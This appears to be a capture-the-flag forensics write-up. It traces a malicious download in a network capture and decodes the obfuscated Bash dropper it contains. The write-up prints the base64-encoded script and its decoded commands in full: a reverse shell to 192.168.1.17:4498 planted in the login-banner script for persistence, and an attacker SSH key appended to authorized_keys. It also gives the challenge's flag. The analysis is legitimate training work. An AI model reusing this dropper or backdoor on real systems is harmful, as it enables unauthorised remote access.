@@ -1,0 +1,93 @@
+#Write-Up:  Fake TP || Forensics Challenge (100 pts)
+
+#Hint: I took a USB key from my hacker friend in CCN to get the correction of the TP and he hacked me! :( I think 'sahbi lhacker' downloaded something on my Linux machine and might have executed it. This network capture is from the time when my laptop was compromised. Find the malicious file that 'sahbi lhacker' downloaded on my PC, analyze it, and you might find the flag.
+
+Step 1: Analyzing the PCAP with Wireshark
+
+I began by opening the provided capture.pcap file in Wireshark to inspect the network traffic during the suspected compromise timeframe.
+
+Filtering HTTP GET Requests:
+- Applied the display filter http.request.method == "GET" to isolate HTTP GET requests, as these are commonly used to download files.
+- After applying the filter, only two HTTP GET requests were displayed.
+- In the second HTTP GET request, I identified the following URL: http://172.17.0.43:5000/ccn-8-correction-tp1.
+- The presence of "tp" in the URL matched the hint, suggesting that this request might be related to the malicious activity.
+
+Following the TCP Stream:
+- Right-clicked on the suspicious HTTP request and selected "Follow" → "TCP Stream" to view the complete communication between the client and server.
+- This revealed the content of the response, which included a script file named ccn-8-tp1.sh.
+
+Step 2: Extracting the Malicious Script
+
+From the HTTP response, I extracted the script named ccn-8-tp1.sh. Recognizing it as a Bash script, I proceeded to analyze its contents.
+
+Initial Execution Attempts:
+
+Editing the Script:
+
+jkome0x@44-03-2C-69-F0-32:~/Downloads$ nano roma.sh
+
+Copied the contents of ccn-8-tp1.sh into a new script named roma.sh for analysis.
+
+Roma.sh content : 
+_______________________________________
+lkdiDEjslkodn7() {
+    ABvnz='ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3R'
+    QOPjH='jcC8xOTIuMTY4LjEuMTcvNDQ5OCAwPiYxIicgPiAvZXR'
+    gQIxX='jL3VwZGF0ZS1tb3RkLmQvMDAtaGVhZGVy'
+    echo "$ABvnz$QOPjH$gQIxX" | base64 -d | bash
+}
+
+n7djeurkdlzohh() {
+    LQebW="ZWNobyAtZSAiXG5zc2gtcnNhIEJCTU8wQjNOemFDMXljMkVBQUFBREFRQUJBQUFDQVFDOFZrcTlVVEtNYWtBeDJacStQblpOYzZuWXVFS"
+    gVR7i="zNaVlh4SDE1YmJVZUIrZWxDYjNKYlZKeUJmdkF1WjBzb25mQXFac3lxOUpnNi9LR3ROc0VtdFZLWHJvUFhoekZ1bVRnZzdaMU52clVOdm5x"
+    bkzHk="TEljZnhUblAxKy80WDI4NGhwMGJGMlZiSVRiNm9RS2d6UmRPczhHdE9hc0thSzBrLy8yRTVvMFJLSUVkcngwYUw1SEJPR1B4MHA4R3JHZTRrU"
+    q97up="ktvQW9rR1h3RFZUMjJMbEJ5bFJrQTYreDZqWnRkMmdZaENNZ1NaMGlNOVJ5WTdrN0sxM3RIWHpFazdPY2lVbWQ1L1o3WXVvbG50M0J5WDlhK0"
+    GYJan="lmTE1EL0ZRTnkxQjREWWhzWTYyTzdvMnhSMHZ4a0JFcDVVaEJBWDhnT1RHMHdqenJVSHhtZFVpbVhnaXkzOVlWWmFUSlF3TEJ0ekpTLy9ZaGt"
+    HJj6A="ld3lGLytDUDBIN3dJS0lFcmxmNVdGSzVza0xZTzZ1S1ZweDZha0dYWThHQURuUFUzaVBLL010QkMrUnFXc3Nka0dxRklBNXhHMkZuK0tsaWQ"
+    fD9Kc="5T2JtMXVYZXhKZllWakpNT2Z2dXF0YjZLY2dMbWk1dVJrQTYreDZqWnRkMmdZaENNZ1NaMGlNOVJ5WTdrN0sxM3RIWHpFazdPY2lVbWQ1L1o3"
+    hpAgs="WXVvbG50M0J5WDlhK0lsU3hhaU9BRDJpTkpib051VUl4TUgvOUhOWUtkNm1sd1Vwb3ZxRmNHQnFYaXpjRjIxYnhOR29PRTMxVmZveDJmcTJx"
+    FqOPN="VzMwQkRXdEhycllpNzZpTGgwMkZlckhFWUhkUUFBQTA4TmZVSHlDdzBmVmwvcXQ2YkFnS1NiMDJrNjkxbGNEQW81SnBFRXpOUXB1YjBYOHhKSXRyYnc"
+    CpJLT="9PU43e200VG45bGNIX1RQX21uXzM0bmRfQ0NOfT4+IH4vLnNzaC9hdXRob3JpemVkX2tle"
+    PIx1p="XM="
+    echo "$LQebW$gVR7i$bkzHk$q97up$GYJan$HJj6A$fD9Kc$hpAgs$FqOPN$CpJLT$PIx1p" | base64 -d | bash
+}
+
+hL8FbEfp9L1261G() {
+    lkdiDEjslkodn7
+    n7djeurkdlzohh
+}
+
+hL8FbEfp9L1261G
+_______________________________
+Attempting to Execute:
+jkome0x@44-03-2C-69-F0-32:~/Downloads$ ./roma.sh
+bash: ./roma.sh: Permission denied
+  - Encountered a permission error when trying to execute the script directly.
+- **Changing Permissions:**
+  ```bash
+  jkome0x@44-03-2C-69-F0-32:~/Downloads$ chmod +x roma.sh
+  jkome0x@44-03-2C-69-F0-32:~/Downloads$ ./roma.sh 
+  bash: line 1: /etc/update-motd.d/00-header: Permission denied
+  bash: line 1: unexpected EOF while looking for matching ```
+
+After making the script executable, executing it resulted in permission denied errors and syntax issues.
+
+Analyzing and Modifying the Script:
+- To bypass execution errors, I removed instances of the bash command from the script. This allowed me to run it using the Bash interpreter directly:
+jkome0x@44-03-2C-69-F0-32:~/Downloads$ bash roma.sh
+Script Execution Result:
+
+echo 'bash -c "bash -i >& /dev/tcp/192.168.1.17/4498 0>&1"' > /etc/update-motd.d/00-header
+echo -e "\nssh-rsa BBMO0B3NzaC1yc2EAAAADAQABAAACAQC8Vkq9UTKMakAx2Zq+PnZNc6nYuEK3ZVXxH15bbUeB+elCb3JbVJyBfvAuZ0sonfAqZsyq9Jg6/KGtNsEmtVKXroPXhzFumTgg7Z1NvrUNvnqLIcfxTnP1+/4X284hp0bF2VbITb6oQKgzRdOs8GtOasKaK0k//2E5o0RKIEdrx0aL5HBOGPx0p8GrGe4kRKoAokGXwDVT22LlBylRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IfLMD/FQNy1B4DYhsY62O7o2xR0vxkBEp5UhBAX8gOTG0wjzrUHxmdUimXgiy39YVZaTJQwLBtzJS//YhkewyF/+CP0H7wIKIErlf5WFK5skLYO6uKVpx6akGXY8GADnPU3iPK/MtBC+RqWssdkGqFIA5xG2Fn+Klid9Obm1uXexJfYVjJMOfvuqtb6KcgLmi5uRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IlSxaiOAD2iNJboNuUIxMH/9HNYKd6mlwUpovqFcGBqXizcF21bxNGoOE31Vfox2fq2qW30BDWtHrrYi76iLh02FerHEYHdQAAA08NfUHyCw0fVl/qt6bAgKSb02k691lcDAo5JpEEzNQpub0X8xJItrbw==N7{m4Tn9lcH_TP_mn_34nd_CCN}" >> ~/.ssh/authorized_keys
+
+Result:
+- The script successfully wrote a reverse shell command to /etc/update-motd.d/00-header.
+- It appended an SSH public key containing the flag N7{m4Tn9lcH_TP_mn_34nd_CCN} to the authorized_keys file, potentially allowing unauthorized SSH access.
+
+Step 3: Identifying the Flag
+
+- Upon executing the modified script, it appended an SSH public key to the ~/.ssh/authorized_keys file. Within this key, the flag was embedded as follows:
+...N7{m4Tn9lcH_TP_mn_34nd_CCN}...
+
+And Bingo ! That was the flag we were looking for !
+flag : N7{m4Tn9lcH_TP_mn_34nd_CCN}
